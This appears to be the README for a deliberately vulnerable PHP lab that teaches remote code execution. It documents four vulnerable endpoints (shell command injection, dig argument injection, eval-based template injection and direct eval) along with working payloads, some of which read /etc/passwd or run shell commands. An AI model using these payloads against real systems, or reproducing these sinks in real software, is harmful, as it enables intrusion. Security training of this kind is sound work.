# rce-basic

The companion lab for the TechEarl RCE spoke article. A small PHP app with four intentionally-vulnerable endpoints, each demonstrating a distinct remote-code-execution pattern: classic OS command injection, argument injection through `escapeshellarg`, server-side template injection (SSTI) in a hand-rolled mini engine, and direct `eval()` of a POST body.

No database. Every sink in this lab is shell-out or interpreter.

## Endpoints

| Endpoint | Method | Vulnerable parameter | Sink |
|---|---|---|---|
| `/ping.php?host=<v>` | GET | `host` | `shell_exec('ping -c 1 -W 1 ' . $host)`; shell metacharacters pass through |
| `/lookup.php?domain=<v>` | GET | `domain` | `shell_exec('dig ' . escapeshellarg($domain))`; quoted, but still positional argv to dig |
| `/template.php` | POST | `tpl` | Hand-rolled `{{ expr }}` engine that `eval`s each placeholder |
| `/calc.php` | POST | `expr` | `eval("return $expr;")` directly on the POST body |

## Running

```bash
docker compose up rce-basic
```

From the root of the `techearl-labs` repo. The lab listens on `http://localhost:8085`.

## Expected exploit paths

### 1. OS command injection: `/ping.php`

`shell_exec` runs the constructed string through `/bin/sh -c`, so shell metacharacters take effect before `ping` ever sees the argument.

```
# Command separator
GET /ping.php?host=localhost;id

# Pipe
GET /ping.php?host=localhost|id

# Backtick command substitution
GET /ping.php?host=`id`

# $() command substitution
GET /ping.php?host=$(id)
```

Each payload returns the `id` output appended to (or replacing) the ping output, depending on which metacharacter you used. The `id` call should resolve to `uid=33(www-data) gid=33(www-data) groups=33(www-data)`.

### 2. Argument injection: `/lookup.php`

`escapeshellarg` correctly quotes the user input so `;`, `|`, backticks, and `$()` cannot break out of the argument. The bug is that the value is still passed as a positional argument to `dig`, and `dig` accepts `-f <file>` as a "batch mode" flag that reads queries from a file. Pointing it at a readable file dumps the contents back through dig's error output.

```
GET /lookup.php?domain=-f /etc/passwd
```

Response includes the contents of `/etc/passwd` as dig parse errors. Any file readable by `www-data` (uid 33) is exfiltrable. The takeaway for the article: `escapeshellarg` only solves shell metacharacter parsing, never argument parsing inside the called binary.

### 3. SSTI: `/template.php`

The mini engine parses `{{ expr }}` placeholders out of the template string and `eval`s each one. The intended demo (`{{ 2 + 2 }}` -> `4`) is on the page. The exploit substitutes any PHP expression.

```
POST /template.php
Content-Type: application/x-www-form-urlencoded

tpl={{ system("id") }}
```

Other useful payloads:

```
tpl={{ file_get_contents("/etc/passwd") }}
tpl={{ `id` }}                          # PHP backtick = shell_exec
tpl=hello {{ phpversion() }}            # benign fingerprint
```

This is the same shape as Twig / Jinja2 / Smarty SSTI in other ecosystems: the template language exposes the host evaluator to whoever controls the template string.

### 4. Direct `eval()`: `/calc.php`

The calculator hands its POST body straight to `eval('return ' . $expr . ';')`. Anything PHP can express runs.

```
POST /calc.php
Content-Type: application/x-www-form-urlencoded

expr=phpinfo()
expr=system("id")
expr=file_get_contents("/etc/passwd")
expr=`id`
```

## Safety

This lab is the most dangerous one in the repo by some margin. Every other lab gives an attacker a database read, a file write, or a request from the lab container. **rce-basic gives an attacker code execution as `www-data` inside the lab container by design.** Once inside they can read the container filesystem, install tools, hit other services on the Docker network, and from there escalate as far as Docker isolation allows on your host.

Concretely:

- The lab binds to `127.0.0.1:8085` by default. Do not change that binding. Do not put this container behind a tunnel, a reverse proxy, or a public hostname. Do not run it on a shared machine.
- Treat the container as compromised the moment you start it. Anything you mount into it is reachable. Do not bind-mount your home directory, SSH keys, or any host path that contains credentials.
- Tear down with `docker compose down` when you are done. Anything written into the container filesystem during the session goes with it.

Never expose this lab to a network you do not own.

## Tearing down

```bash
docker compose down
```

No named volumes, so nothing persists between runs.
